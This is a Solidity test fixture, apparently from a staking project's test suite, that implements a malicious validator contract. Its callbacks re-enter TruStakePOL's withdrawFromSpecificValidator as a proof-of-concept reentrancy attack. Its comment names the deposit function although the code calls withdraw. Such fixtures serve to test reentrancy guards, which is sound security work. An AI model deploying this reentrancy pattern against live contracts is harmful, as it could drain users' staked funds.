// SPDX-License-Identifier: GPL-3.0

pragma solidity =0.8.28;

import {TruStakePOL} from "../../contracts/main/TruStakePOL.sol";
import {IValidatorShare} from "../../contracts/interfaces/IValidatorShare.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// proof of concept reentrancy attack on TruStakePOL deposit function.

contract MaliciousValidator_Withdraw is IValidatorShare {
    TruStakePOL public staker;
    IERC20 public polToken;

    uint256 halfDeposit;

    constructor(address _stakerAddress, address _polTokenAddress) {
        staker = TruStakePOL(_stakerAddress);
        polToken = IERC20(_polTokenAddress);
    }

    function attack(uint256 amount) external payable {
        halfDeposit = amount / 2;
        polToken.approve(address(staker), halfDeposit);

        // deposit to the attacker validator
        staker.withdrawFromSpecificValidator(halfDeposit, address(this));
    }

    // the staker's deposit function pefroms an external call to the validator contract
    //  that allow to re-enter any nonReentrant functions in the same transaction
    function buyVoucherPOL(uint256 _amount, uint256) external pure returns (uint256 amountToDeposit) {
        return _amount;
    }

    function sellVoucher_newPOL(uint256, /*claimAmount*/ uint256 /*maximumSharesToBurn*/ ) external {
        polToken.approve(address(staker), halfDeposit);
        staker.withdrawFromSpecificValidator(halfDeposit, address(this));
    }

    function unstakeClaimTokens_newPOL(uint256 unbondNonce) external {}

    function getLiquidRewards(address user) external view returns (uint256) {}

    function restakePOL() external returns (uint256 amountRestaked, uint256 liquidReward) {}

    function unbondNonces(address) external view returns (uint256) {}

    function balanceOf(address) external view returns (uint256) {}

    function approve(address, uint256) external {}

    function transfer(address, uint256) external {}

    function transferFrom(address, address, uint256) external {}

    function unbonds_new(address, uint256) external view returns (uint256, uint256) {}

    function exchangeRate() external view returns (uint256) {}

    function getTotalStake(address) external view returns (uint256, uint256) {}
}
